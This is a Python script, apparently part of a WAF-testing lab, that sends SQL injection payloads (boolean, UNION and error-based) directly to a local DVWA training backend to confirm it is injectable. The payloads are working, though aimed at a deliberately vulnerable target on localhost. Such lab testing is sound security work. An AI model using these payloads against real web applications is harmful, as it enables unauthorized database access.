#!/usr/bin/env python3
"""
Test SQL oracle directly against backend (bypassing WAF) to confirm vulnerability
"""
import time
import sys
import os
sys.path.insert(0, os.path.join(os.path.dirname(__file__)))

from dvwa_session import DVWASession

def oracle_test_backend():
    """Test oracles directly on backend port 18081"""
    
    print("=== Step 3C: SQL Oracle on Backend (No WAF) ===\n")
    
    BACKEND = "http://localhost:18081"
    
    sess = DVWASession(BACKEND, timeout=20.0, backend_base=None)
    
    try:
        # Login to backend
        print("Logging in to DVWA backend...")
        if not sess.login():
            print("⚠️  Login failed, using cookie fallback...")
            sess.client.cookies.set("security", "low", domain="localhost")
            sess.client.cookies.set("PHPSESSID", "test", domain="localhost")
        else:
            print("✅ Login successful")
            sess.set_security("low")
            print("✅ Security set to low")
        
        # Test 1: Baseline
        print("\nTesting baseline query...")
        t0 = time.time()
        r0 = sess.get("/vulnerabilities/sqli/", params={"id": "1", "Submit": "Submit"})
        baseline_time = int((time.time() - t0) * 1000)
        baseline_len = len(r0.content)
        baseline_code = r0.status_code
        print(f"Baseline: status={baseline_code} time={baseline_time}ms len={baseline_len}")
        
        # Test 2: Boolean oracle TRUE
        print("\nTesting boolean oracle...")
        t1 = time.time()
        r1 = sess.get("/vulnerabilities/sqli/", params={"id": "1' AND '1'='1", "Submit": "Submit"})
        bool_true_time = int((time.time() - t1) * 1000)
        bool_true_len = len(r1.content)
        
        t2 = time.time()
        r2 = sess.get("/vulnerabilities/sqli/", params={"id": "1' AND '1'='2", "Submit": "Submit"})
        bool_false_time = int((time.time() - t2) * 1000)
        bool_false_len = len(r2.content)
        
        print(f"  True:  status={r1.status_code} time={bool_true_time}ms len={bool_true_len}")
        print(f"  False: status={r2.status_code} time={bool_false_time}ms len={bool_false_len}")
        print(f"  Length diff: {abs(bool_true_len - bool_false_len)} bytes")
        
        if abs(bool_true_len - bool_false_len) > 50:
            print("  ✅ Boolean oracle WORKS - SQL injection is possible")
        else:
            print("  ❌ Boolean oracle FAILS")
        
        # Test 3: UNION to detect column count
        print("\nTesting UNION injection...")
        t3 = time.time()
        r3 = sess.get("/vulnerabilities/sqli/", params={"id": "1' UNION SELECT 1,2-- -", "Submit": "Submit"})
        union_time = int((time.time() - t3) * 1000)
        union_len = len(r3.content)
        print(f"  UNION: status={r3.status_code} time={union_time}ms len={union_len}")
        
        if union_len > baseline_len + 50:
            print("  ✅ UNION injection WORKS - shows extra data")
        else:
            print("  ⚠️  UNION may not work or different column count")
        
        # Test 4: Error-based
        print("\nTesting error-based injection...")
        r4 = sess.get("/vulnerabilities/sqli/", params={"id": "1'", "Submit": "Submit"})
        has_error = "sql" in r4.text.lower() or "mysql" in r4.text.lower() or "error" in r4.text.lower()
        print(f"  Error response: {has_error}")
        if has_error:
            print("  ✅ Error-based injection possible - SQL errors leaked")
        
        print("\n" + "="*60)
        print("BACKEND DIAGNOSIS:")
        print(f"  Baseline works: {baseline_code == 200}")
        print(f"  Boolean oracle: {abs(bool_true_len - bool_false_len) > 50}")
        print(f"  UNION works: {union_len > baseline_len + 50}")
        print(f"  Error-based: {has_error}")
        
        if abs(bool_true_len - bool_false_len) > 50:
            print("\n✅ DVWA backend IS vulnerable to SQL injection")
            print("✅ This confirms WAF is blocking legitimate attack attempts")
            print("✅ The 'bypass' payloads were actually BLOCKED by WAF")
        else:
            print("\n❌ Backend may not be vulnerable or requires different approach")
            
    finally:
        sess.close()

if __name__ == "__main__":
    try:
        oracle_test_backend()
    except Exception as e:
        print(f"Error: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)
